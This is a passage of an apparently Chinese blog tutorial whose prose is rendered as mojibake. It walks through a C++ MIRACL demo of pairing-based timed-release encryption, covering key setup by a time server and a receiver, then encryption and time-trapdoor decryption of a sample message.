y0);<br>    Q *= cof;<br>    <span class="hljs-keyword">return</span> Q;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">xorStrings</span><span class="hljs-params">(<span class="hljs-type">char</span>* str1, <span class="hljs-type">char</span>* str2, <span class="hljs-type">char</span>* result, <span class="hljs-type">int</span> len)</span> </span>&#123;<br><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br><br>        <span class="hljs-type">char</span> c1 = str1[i];<br>        <span class="hljs-type">char</span> c2 = str2[i];<br><br>        result[i] = c1 ^ c2;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-function">ofstream <span class="hljs-title">common</span><span class="hljs-params">(<span class="hljs-string">&quot;common.ibe&quot;</span>)</span></span>;<br>    <span class="hljs-function">ofstream <span class="hljs-title">master</span><span class="hljs-params">(<span class="hljs-string">&quot;master.ibe&quot;</span>)</span></span>;<br>    <span class="hljs-comment">//ECn P,Ppub;</span><br>    ECn P, Q;<br>    <span class="hljs-comment">//ZZn px,py;//è‡ªåŠ ï¼Œå®šä¹‰çš„æ˜¯ç‚¹çš„x,yåæ ‡</span><br>    ZZn2 cube, w;<span class="hljs-comment">//è‡ªåŠ </span><br>   <span class="hljs-comment">// ZZn2 cube;</span><br>   <span class="hljs-comment">// Big s,p,q,t,n,cof,x,y;</span><br>    Big a, b, c, d1, d2, p, q, t, n, cof;<br>    <span class="hljs-type">long</span> seed;<br>    <span class="hljs-type">char</span> pad[HASH_LEN1];<span class="hljs-comment">//è‡ªåŠ </span><br>    <span class="hljs-comment">//char pad[20]=&#123;0&#125;;</span><br>    miracl* mip = &amp;precision;<br><br>    cout &lt;&lt; <span class="hljs-string">&quot;Enter 9 digit random number seed  = &quot;</span>;<br>    cin &gt;&gt; seed;<br>    <span class="hljs-built_in">irand</span>(seed);<br><br>    <span class="hljs-comment">// SET-UP</span><br>    <span class="hljs-comment">/*-------------------------------------------------------------äº§ç”Ÿç´ æ•°é˜¶q-------------------------------------------------------------------------*/</span><br>    q = <span class="hljs-built_in">pow</span>((Big)<span class="hljs-number">2</span>, <span class="hljs-number">159</span>) + <span class="hljs-built_in">pow</span>((Big)<span class="hljs-number">2</span>, <span class="hljs-number">17</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//    q=pow((Big)2,160)-pow((Big)2,76)-1;</span><br><br>    cout &lt;&lt; <span class="hljs-string">&quot;q= &quot;</span> &lt;&lt; q &lt;&lt; endl;<br>    <span class="hljs-comment">//int logq=bits(q);//è®¡ç®—qçš„äºŒè¿›åˆ¶ä½æ•°ï¼Œè¿™é‡Œæ˜¯160</span><br><span class="hljs-comment">//cout &lt;&lt; &quot;log q= &quot; &lt;&lt; logq &lt;&lt; endl;</span><br><br><span class="hljs-comment">/*--------------------------------------------------------------äº§ç”Ÿç´ æ•°p-------------------------------------------------------------------------*/</span><br><span class="hljs-comment">//generate p</span><br>    t = (<span class="hljs-built_in">pow</span>((Big)<span class="hljs-number">2</span>, PBITS) - <span class="hljs-number">1</span>) / (<span class="hljs-number">2</span> * q);<br>    a = (<span class="hljs-built_in">pow</span>((Big)<span class="hljs-number">2</span>, PBITS - <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>) / (<span class="hljs-number">2</span> * q);<br>    forever<br>    &#123;<br>        n = <span class="hljs-built_in">rand</span>(t);<br>        <span class="hljs-keyword">if</span> (n &lt; a) <span class="hljs-keyword">continue</span>;<br>        p = <span class="hljs-number">2</span> * n * q - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (p % <span class="hljs-number">24</span> != <span class="hljs-number">11</span>) <span class="hljs-keyword">continue</span>;  <span class="hljs-comment">// must be 2 mod 3, also 3 mod 8</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">prime</span>(p)) <span class="hljs-keyword">break</span>;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;p= &quot;</span> &lt;&lt; p &lt;&lt; endl;<br><br>    cof = <span class="hljs-number">2</span> * n;<br><br>    <span class="hljs-built_in">ecurve</span>(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, p, MR_PROJECTIVE);    <span class="hljs-comment">// elliptic curve y^2=x^3+1 mod p</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Find suitable cube root of unity (solution in Fp2 of x^3=1 mod p)</span><br><span class="hljs-comment">//    </span><br>    forever<br>    &#123;<br>        <span class="hljs-comment">//    cube=pow(randn2(),(p+1)*(p-1)/3);</span><br>            cube = <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">randn2</span>(),(p + <span class="hljs-number">1</span>) / <span class="hljs-number">3</span>);<br>            cube = <span class="hljs-built_in">pow</span>(cube,p - <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (!cube.<span class="hljs-built_in">isunity</span>()) <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    cout &lt;&lt; <span class="hljs-string">&quot;Cube root of unity= &quot;</span> &lt;&lt; cube &lt;&lt; endl;<br><br>    <span class="hljs-keyword">if</span> (!(cube * cube * cube).<span class="hljs-built_in">isunity</span>())<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;sanity check failed&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Choosing an arbitrary P ....</span><br>    <span class="hljs-comment">/*-------------------------------------------------------------äº§ç”Ÿæ¤­åœ†æ›²çº¿ä¸Šä»»æ„ç‚¹Pï¼ˆç”Ÿæˆå…ƒï¼‰-------------------------------------------------------------------------*/</span><br>    forever<br>    &#123;<br>        <span class="hljs-keyword">while</span> (!P.<span class="hljs-built_in">set</span>(<span class="hljs-built_in">randn</span>()));<br>        P *= cof;<br>        <span class="hljs-keyword">if</span> (!P.<span class="hljs-built_in">iszero</span>()) <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>        <span class="hljs-comment">// cout &lt;&lt; &quot;Point P= &quot; &lt;&lt; P &lt;&lt; endl; //</span><br>    cout &lt;&lt; <span class="hljs-string">&quot;ç”Ÿæˆå…ƒP=&quot;</span> &lt;&lt; P &lt;&lt; endl;<br><br>    <span class="hljs-comment">/*-------------------------------------------------------------äº§ç”Ÿæ¤­åœ†æ›²çº¿ä¸Šä»»æ„ç‚¹Q-------------------------------------------------------------------------*/</span><br>    forever<br>    &#123;<br>        <span class="hljs-keyword">while</span> (!Q.<span class="hljs-built_in">set</span>(<span class="hljs-built_in">randn</span>()));<br>        Q *= cof;<br>        <span class="hljs-keyword">if</span> (!Q.<span class="hljs-built_in">iszero</span>()) <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    cout &lt;&lt; <span class="hljs-string">&quot;Point Q= &quot;</span> &lt;&lt; Q &lt;&lt; endl; <span class="hljs-comment">//</span><br>    <br>    <span class="hljs-comment">//æ—¶é—´æœåŠ¡å™¨è®¡ç®—å…¬é’¥</span><br>    Big s = <span class="hljs-built_in">rand</span>(q);<br>    ECn ts_pub = s * P;<br>    cout &lt;&lt; <span class="hljs-string">&quot;ts_pub=&quot;</span> &lt;&lt; ts_pub &lt;&lt; endl;<br>    <span class="hljs-comment">//æ¥æ”¶æ–¹è®¡ç®—å…¬é’¥ç§é’¥</span><br>    Big u = <span class="hljs-built_in">rand</span>(q);<br>    Big usk = u;<br>    cout &lt;&lt; <span class="hljs-string">&quot;usk=&quot;</span> &lt;&lt; usk &lt;&lt; endl;<br>    ECn upk = u * P;<br>    <span class="hljs-comment">//å‘é€æ–¹è®¡ç®—å¯†æ–‡</span><br>    Big r = <span class="hljs-built_in">rand</span>(q);<br>    ECn U = r * P;<br><br>    <span class="hljs-type">char</span> T[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;2023-09-21-21-13&quot;</span>;<br>    <span class="hljs-comment">//è®¡ç®—k</span><br>    ECn RT = r * <span class="hljs-built_in">map_to_point</span>(T, cof);<br>    ECn <span class="hljs-type">u_t</span> = upk + ts_pub;<br>    ZZn2 k;<br>    <span class="hljs-built_in">ecap</span>(RT, <span class="hljs-type">u_t</span>, q, cube, k);<br>    cout &lt;&lt; <span class="hljs-string">&quot;k=&quot;</span> &lt;&lt; k &lt;&lt; endl;<br>    <span class="hljs-comment">//è®¡ç®—V</span><br>    <span class="hljs-type">char</span> M[<span class="hljs-number">20</span>] = <span class="hljs-string">&quot;abcdefghijklmn&quot;</span>; <span class="hljs-comment">//æ˜æ–‡</span><br>    cout &lt;&lt; <span class="hljs-string">&quot;M:&quot;</span> &lt;&lt; M &lt;&lt; endl;<br>    <span class="hljs-type">char</span> c2[<span class="hljs-number">81</span>] = <span class="hljs-string">&quot;\0&quot;</span>;<br>    <span class="hljs-type">char</span> V[<span class="hljs-number">81</span>] = <span class="hljs-string">&quot;\0&quot;</span>;<br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">H2</span>(k, c2);<br>    cout &lt;&lt; <span class="hljs-string">&quot;c2=&quot;</span> &lt;&lt; c2 &lt;&lt; endl;<br>    <span class="hljs-built_in">xorStrings</span>(c2, M, V, <span class="hljs-number">20</span>);<br>    cout &lt;&lt; <span class="hljs-string">&quot;V=&quot;</span> &lt;&lt; V &lt;&lt; endl;<br><br>    <span class="hljs-comment">//æ—¶é—´æœåŠ¡å™¨è®¡ç®—æ—¶é—´é™·é—¨SH1(T)</span><br>    ECn ST = s * <span class="hljs-built_in">map_to_point</span>(T, cof);<br>    <span class="hljs-comment">//æ¥æ”¶æ–¹è®¡ç®—UT,K&#x27;ï¼Œè®¡ç®—M</span><br>    ECn UT = usk * <span class="hljs-built_in">map_to_point</span>(T, cof);<br>    ZZn2 k_;<br>    ECn SU = ST + UT;<br>    <span class="hljs-built_in">ecap</span>(SU, U, q, cube, k_);<br>    cout &lt;&lt; <span class="hljs-string">&quot;k&#x27;=&quot;</span> &lt;&lt; k_ &lt;&lt; endl;<br><br>    <span class="hljs-type">char</span> m1[<span class="hljs-number">31</span>] = <span class="hljs-string">&quot;\0&quot;</span>;<br>    len = <span class="hljs-built_in">H2</span>(k_, m1);<br>    cout &lt;&lt; len &lt;&lt; endl;<br>    cout &lt;&lt; m1 &lt;&lt; endl;<br>    <span class="hljs-type">char</span> m[<span class="hljs-number">21</span>] = <span class="hljs-string">&quot;\0&quot;</span>;<br>    <span class="hljs-built_in">xorStrings</span>(V, m1, m, <span class="hljs-number">20</span>);<br>    cout &lt;&lt; <span class="hljs-string">&quot;M=&quot;</span> &lt;&lt; m;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å…³äºmainå‡½æ•°çš„å…·ä½“åˆ†æ">å…³äºmainå‡½æ•°çš„å…·ä½“åˆ†æ</h2><p>ç›¸å…³è¿ç®—å‡½æ•°éƒ½å·²ç»å†™å¥½ï¼Œåªéœ€è¦æŒ‰æ­¥éª¤æ‰§è¡Œå³å¯</p><h3 id="åˆå§‹åŒ–-2">åˆå§‹åŒ–</h3><ul><li>é¦–å…ˆç”Ÿæˆç´ æ•°é˜¶<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>ï¼Œéšåç”Ÿæˆ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>ï¼Œç¡®å®šæ¤­åœ†æ›²çº¿åŸŸï¼Œéšåäº§ç”Ÿæ¤­åœ†æ›²çº¿ç”Ÿæˆå…ƒ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></li></ul><h3 id="åŠ å¯†è§£å¯†è¿‡ç¨‹">åŠ å¯†è§£å¯†è¿‡ç¨‹</h3><ul><li><p>éšåæ—¶é—´æœåŠ¡å™¨éƒ¨åˆ†æ ¹æ®æ­¥éª¤äº§ç”Ÿéšæœºæ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span>åšä¸ºç§é’¥ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo>â‹…</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">s\cdot P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4445em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>ä½œä¸ºå…¬é’¥</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//æ—¶é—´æœåŠ¡å™¨è®¡ç®—å…¬é’¥</span><br>Big s = <span class="hljs-built_in">rand</span>(q);<br>ECn ts_pub = s * P;<br>cout &lt;&lt; <span class="hljs-string">&quot;ts_pub=&quot;</span> &lt;&lt; ts_pub &lt;&lt; endl;<br></code></pre></td></tr></table></figure></li><li><p>æ¥æ”¶æ–¹é€‰å–éšæœºæ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">u</span></span></span></span>ä½œä¸ºç§é’¥ï¼Œè®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><mo>â‹…</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">u\cdot P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4445em;"></span><span class="mord mathnormal">u</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>ä½œä¸ºå…¬é’¥</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"> <span class="hljs-comment">//æ¥æ”¶æ–¹è®¡ç®—å…¬é’¥ç§é’¥</span><br>Big u = <span class="hljs-built_in">rand</span>(q);<br>Big usk = u;<br>cout &lt;&lt; <span class="hljs-string">&quot;usk=&quot;</span> &lt;&lt; usk &lt;&lt; endl;<br>ECn upk = u * P;<br></code></pre></td></tr></table></figure></li><li><p>å‘é€æ–¹å‘é€çš„æ¶ˆæ¯ä¸º<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>ï¼Œé€‰å–éšæœºæ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>è®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>U</mi><mo>=</mo><mi>r</mi><mo>âˆ—</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">U=r*P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"> <span class="hljs-comment">//å‘é€æ–¹è®¡ç®—</span><br>Big r = <span class="hljs-built_in">rand</span>(q);<br>ECn U = r * P;<br></code></pre></td></tr></table></figure></li><li><p>è®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mo>=</mo><mi>e</mi><mo stretchy="false">(</mo><mi>r</mi><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>u</mi><mi>P</mi><mo>+</mo><mi>s</mi><mi>P</mi><mo stretchy="false">)</mo><mo>=</mo><mi>e</mi><mo stretchy="false">(</mo><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>P</mi><msup><mo stretchy="false">)</mo><mrow><mi>r</mi><mo stretchy="false">(</mo><mi>u</mi><mo>+</mo><mi>s</mi><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">K=e(rH_1(T),uP+sP)=e(H_1(T),P)^{r(u+s)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">u</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">s</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span>ï¼Œå…¶ä¸­<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e()</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mclose">)</span></span></span></span>ä¸ºåŒçº¿æ€§å¯¹è¿ç®—ï¼Œä¹Ÿå°±æ˜¯å‡½æ•°ecap</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//é€‰å®šæ—¶é—´T</span><br><span class="hljs-type">char</span> T[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;2023-09-21-21-13&quot;</span>;<br><span class="hljs-comment">//è®¡ç®—k</span><br><span class="hljs-comment">//è®¡ç®—rH1(T)</span><br>ECn RT = r * <span class="hljs-built_in">map_to_point</span>(T, cof);<br><span class="hljs-comment">//è®¡ç®—uP+sP</span><br>ECn <span class="hljs-type">u_t</span> = upk + ts_pub;<br>ZZn2 k;<br><span class="hljs-built_in">ecap</span>(RT, <span class="hljs-type">u_t</span>, q, cube, k);<br>cout &lt;&lt; <span class="hljs-string">&quot;k=&quot;</span> &lt;&lt; k &lt;&lt; endl;<br></code></pre></td></tr></table></figure></li><li><p>å¯†æ–‡<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>=</mo><mo>&lt;</mo><mi>U</mi><mo separator="true">,</mo><mi>V</mi><mo>&gt;</mo><mo>=</mo><mo>&lt;</mo><mi>r</mi><mi>P</mi><mo separator="true">,</mo><mi>M</mi><mo>âŠ•</mo><msub><mi>H</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>K</mi><mo stretchy="false">)</mo><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">C=&lt;U,V&gt;=&lt;rP,M\oplus H_2(K)&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7224em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;=&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span></span></span></span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//è®¡ç®—V</span><br><span class="hljs-type">char</span> M[<span class="hljs-number">20</span>] = <span class="hljs-string">&quot;abcdefghijklmn&quot;</span>;<br>cout &lt;&lt; <span class="hljs-string">&quot;M:&quot;</span> &lt;&lt; M &lt;&lt; endl;<br><span class="hljs-type">char</span> c2[<span class="hljs-number">81</span>] = <span class="hljs-string">&quot;\0&quot;</span>,V[<span class="hljs-number">81</span>] = <span class="hljs-string">&quot;\0&quot;</span>;<br><span class="hljs-comment">//c2ä¸ºH2(K)</span><br><span class="hljs-type">int</span> len = <span class="hljs-built_in">H2</span>(k, c2);<br>cout &lt;&lt; <span class="hljs-string">&quot;c2=&quot;</span> &lt;&lt; c2 &lt;&lt; endl;<br><span class="hljs-comment">//å¼‚æˆ–</span><br><span class="hljs-built_in">xorStrings</span>(c2, M, V, <span class="hljs-number">20</span>);<br>cout &lt;&lt; <span class="hljs-string">&quot;V=&quot;</span> &lt;&lt; V &lt;&lt; endl;<br></code></pre></td></tr></table></figure></li><li><p>åœ¨è§£å¯†æ—¶é—´<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span>æ—¶æ—¶é—´æœåŠ¡å™¨è®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>T</mi></msub><mo>=</mo><mi>t</mi><msub><mi>s</mi><mrow><mi>p</mi><mi>r</mi><mi>i</mi><mi>v</mi></mrow></msub><mo>â‹…</mo><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>=</mo><mi>s</mi><msub><mi>H</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S_T=ts_{priv}\cdot H_1(T)=sH_1(T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9012em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">s</span><span 